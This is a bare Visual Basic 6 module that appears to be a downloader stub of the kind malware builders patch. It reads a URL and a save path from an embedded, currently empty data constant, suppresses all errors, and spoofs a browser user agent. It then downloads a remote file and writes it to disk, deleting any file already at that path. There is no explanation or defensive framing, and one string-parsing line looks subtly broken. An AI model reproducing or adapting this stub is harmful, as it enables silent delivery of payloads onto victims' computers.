Attribute VB_Name = "m"
Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" (ByVal hOpen As Long, ByVal sUrl As String, ByVal sHeaders As String, ByVal lLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
Const Data = ""
Sub Main()
  On Error Resume Next
  
  Dim hInternet As Long, hHttp As Long, bRet As Long, sBuff As String * 2048, lNumberOfBytesRead As Long, sBuffer As String
  Dim strTo As String, strURL As String, ttt As String
  ttt = Mid(Data, 1, InStr(Data, Chr(1)) - 1)
  
  strTo = Mid(ttt, InStr(Data, vbCrLf) + 2)
  strURL = Mid(ttt, 1, InStr(ttt, vbCrLf) - 1)
  
  
  hInternet = InternetOpen("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.12) Gecko/Firefox/2.0.0.12", 0, vbNullString, vbNullString, 0)
  If hInternet = 0 Then Exit Sub
  
  hHttp = InternetOpenUrl(hInternet, strURL, vbNullString, 0, &H80000000, 0)
  If hHttp = 0 Then Exit Sub
  
  Dim FF As Long
  FF = FreeFile
  If Dir(strTo) <> "" Then Call Kill(strTo)
  Open strTo For Binary Access Write As #FF
  
  Do
    bRet = InternetReadFile(hHttp, sBuff, Len(sBuff), lNumberOfBytesRead)
    If lNumberOfBytesRead = 0 Then Exit Do
    sBuffer = Left(sBuff, lNumberOfBytesRead)
    Put #FF, , sBuffer
    DoEvents
  Loop
  
  Close #FF
  Call InternetCloseHandle(hHttp)
  Call InternetCloseHandle(hInternet)

End Sub
